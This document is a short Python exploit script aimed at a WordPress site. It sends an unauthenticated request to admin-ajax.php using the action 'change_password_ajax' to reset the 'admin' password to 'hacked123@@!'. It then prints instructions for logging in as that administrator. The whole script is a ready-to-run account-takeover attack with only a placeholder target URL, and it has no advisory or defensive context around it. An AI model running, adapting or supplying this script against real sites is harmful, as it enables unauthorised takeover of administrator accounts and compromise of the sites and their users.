import requests

TARGET = 'https://site.com/'
USERNAME = 'admin'
NEW_PASSWORD = 'hacked123@@!'

AJAX_URL = f"{TARGET}/wp-admin/admin-ajax.php"

data = {
    'action': 'change_password_ajax',
    'login': USERNAME,
    'new_password': NEW_PASSWORD
}

print(f"[+] Trying to reset password for user '{USERNAME}'...")
response = requests.post(AJAX_URL, data=data)

if response.status_code == 200:
    if 'success' in response.text:
        print("[âœ“] Password changed successfully!")
        print(f"[!] Try logging in as '{USERNAME}' with new password: {NEW_PASSWORD}")
    else:
        print("[x] Server responded but may have failed.")
        print("Response:", response.text)
else:
    print("[x] Request failed with status code", response.status_code)

